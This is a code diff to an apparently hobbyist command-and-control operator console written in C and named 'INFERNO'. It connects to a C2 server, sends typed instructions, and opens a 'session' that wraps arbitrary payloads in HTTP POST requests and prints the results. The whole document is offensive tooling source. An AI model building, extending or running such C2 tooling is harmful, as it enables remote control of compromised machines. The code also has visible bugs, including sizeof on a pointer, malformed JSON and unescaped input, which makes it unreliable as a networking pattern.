@@ -4,22 +4,32 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
 #define IP "127.0.0.1"
-#define PORT 8000
+#define PORT 33333
 
 //print the banner
 void banner();
+
 //sending infos between operators
 void info();
+
 //the networked part
-void networking();
+void networking(int inferno_socket);
+
+//session
+char *session_http(int inferno_socket);
 
 int main() {
+    //socket
+    printf("\033[38;5;208m");
+    printf("[>] ");
+    printf("\033[0m");
+    printf("Initializing socket...\n");
+    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
     banner();
     info();
-    networking();
+    networking(inferno_socket);
 }
 
 void banner() {
@@ -48,14 +58,11 @@ void info() {
     printf("\033[0m");
 }
 
-void networking() {
-    //socket
-    printf("\033[38;5;208m");
-    printf("[>] ");
-    printf("\033[0m");
-    printf("Initializing socket...\n");
+void networking(int inferno_socket) {
+    // check if session is ready
+    int session_ready = 0;
 
-    int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    // crafting all necessary for address
     struct sockaddr_in c2_address;
     memset(&c2_address, 0, sizeof(c2_address));
     c2_address.sin_family = AF_INET;
@@ -74,7 +81,6 @@ void networking() {
     printf("Connected\n");
 
     while (1) {
-        int payload;
         //crafting task
         static char instruction[1024];
         printf("\n[ASX]@[INFERNO]> ");
@@ -86,26 +92,22 @@ void networking() {
 
         instruction[strcspn(instruction, "\n")] = '\0';
     
+        //exiting c2
         if (strcmp(instruction, "exit") == 0) {
             printf("\033[38;5;208m");
             printf("[>] ");
             printf("\033[0m");
-            puts("\nClosing c2 and exiting...");
+            puts("Closing c2 and exiting...");
             exit(EXIT_SUCCESS);
         }
 
-        if (strcmp(instruction, "whoami") == 0) {
-            payload = 1;
-        } else {
-            payload = 10;
-        }
-        
+        //starting HTTP listener
         if (strcmp(instruction, "http") == 0) {
             printf("\033[38;5;208m");
             printf("\n[>] ");
-            printf("\033[0m");
-            
+            printf("\033[0m");            
             puts("Starting listener...");
+            
             printf("\033[38;5;208m");
             printf("[>] ");
             printf("\033[0m");
@@ -115,36 +117,107 @@ void networking() {
             printf(" IP: %s                  \n", IP);
             puts("==============================");
             printf(" PORT: 80                \n");
-            puts("==============================");
-            continue;
+            puts("==============================\n");
         }
-        
-        
-        //sending
-        char request[1024];
-        sprintf(request, "POST /endpoint HTTP/1.0\r\n");
-        sprintf(request + strlen(request), "Host: inferno.com\r\n");
-        sprintf(request + strlen(request), "Content-Type: application/json\r\n");
-        sprintf(request + strlen(request), "Content-Length: %d\r\n", payload);
-        sprintf(request + strlen(request), "Connection: close\r\n\r\n");
-        sprintf(request + strlen(request), "{'type':'ghost','element':'fire','place':'mansion':'state':'haunted'}");
 
-        ssize_t inferno_send = send(inferno_socket, request, sizeof(request), 0);
+        //entering session
+        if (strcmp(instruction, "enter") == 0 && session_ready) {
+            session_http(inferno_socket);
+        }
+
+        //sending
+        ssize_t inferno_send = send(inferno_socket, instruction, sizeof(instruction), 0);
 
         // wait for response
         char receive[1024];
-
         printf("\033[38;5;208m");
-        printf("\n[>] ");
+        printf("[>] ");
         printf("\033[0m");
         printf("Waiting for response...\n");
-        
+
+        //receiving from server
         int inferno_receive = recv(inferno_socket, receive, sizeof(receive), 0);
         receive[strcspn(receive, "\n")] = '\0';
-        
         printf("\033[38;5;208m");
         printf("[>] ");
         printf("\033[0m");
         printf("Result: %s\n", receive);
+
+        //checking session status
+        if (strcmp(receive, "ok") == 0) {
+            session_ready = 1;
+            printf("\033[38;5;208m");
+            printf("[>] ");
+            printf("\033[0m");
+            printf("SessionX is ready!\n");
+        }
+    }
+}
+
+char *session_http(int inferno_socket) {
+    printf("\033[38;5;208m");
+    printf("[>] ");
+    printf("\033[0m");
+    printf("Entering sessionX...\n");
+
+    //sending session status to server
+    char *status = "ok";
+    ssize_t inferno_send = send(inferno_socket, status, sizeof(status), 0);
+    printf("\033[38;5;208m");
+    printf("[>] ");
+    printf("\033[0m");
+    printf("Sent: %s\n", status);
+
+    while (1) {
+    	//crafting task
+    	static char instruction_payload[1024];
+    	printf("\n[ASX]@[SESSION]> ");
+
+    	if (fgets(instruction_payload, sizeof(instruction_payload), stdin) == NULL){
+            perror("fgets failed");
+            exit(EXIT_FAILURE);
+        }
+
+        instruction_payload[strcspn(instruction_payload, "\n")] = '\0';
+    
+        //exiting session
+        if (strcmp(instruction_payload, "exit") == 0) {
+            printf("\033[38;5;208m");
+            printf("[>] ");
+            printf("\033[0m");
+            puts("Closing c2 and exiting...");
+            exit(EXIT_SUCCESS);
+        }
+
+        //HTTP POST payload
+        static char request[1024];
+        sprintf(request, "POST /endpoint HTTP/1.0\r\n");
+        sprintf(request + strlen(request), "Host: inferno.com\r\n");
+        sprintf(request + strlen(request), "Content-Type: application/json\r\n");
+        sprintf(request + strlen(request), "Content-Length: %d\r\n", strlen(instruction_payload) + 14);
+        sprintf(request + strlen(request), "Connection: close\r\n\r\n");
+        sprintf(request + strlen(request), "{'payload':'%s'}", instruction_payload);
+
+        //send payload to server
+        printf("\033[38;5;208m");
+        printf("[>] ");
+        printf("\033[0m");
+        printf("Sending payload to server: %s\n", instruction_payload);
+        ssize_t inferno_send = send(inferno_socket, request, sizeof(request), 0);
+
+        // wait for response
+        char result[1024];
+        printf("\033[38;5;208m");
+        printf("[>] ");
+        printf("\033[0m");
+        printf("Waiting for response...\n");
+
+        //receiving payload result from server
+        int inferno_receive = recv(inferno_socket, result, sizeof(result), 0);
+        result[strcspn(result, "\n")] = '\0';
+        printf("\033[38;5;208m");
+        printf("[>] ");
+        printf("\033[0m");
+        printf("Result: %s\n", result); 
     }
 }
